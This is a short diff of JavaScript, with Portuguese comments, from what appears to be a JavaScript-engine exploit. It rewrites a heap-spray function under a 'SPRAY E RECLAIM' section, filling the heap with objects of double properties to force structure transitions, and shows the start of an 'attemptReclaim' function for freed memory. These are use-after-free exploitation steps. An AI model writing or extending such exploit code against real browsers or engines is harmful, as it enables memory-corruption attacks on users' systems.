@@ -86,11 +86,17 @@ function clearStack() {
 // =========================================================================
 // SPRAY E RECLAIM
 // =========================================================================
-function createSprayArray(size, marker = 13.37) {
-  const arr = new Array(size);
-  for (let i = 0; i < size; i++) arr[i] = marker;
-  return arr;
+function createSprayArray(size) {
+    // Criar objetos com propriedades double para ocupar o mesmo heap
+    let spray = [];
+    for (let i = 0; i < 100; i++) {
+        let obj = { a: 1.1, b: 2.2, c: 3.3, d: 4.4 };
+        obj['prop' + i] = 13.37; // Força transição de estrutura
+        spray.push(obj);
+    }
+    return spray;
 }
+
 
 function attemptReclaim(freed, attempt) {
   const markerByte = 0x42;
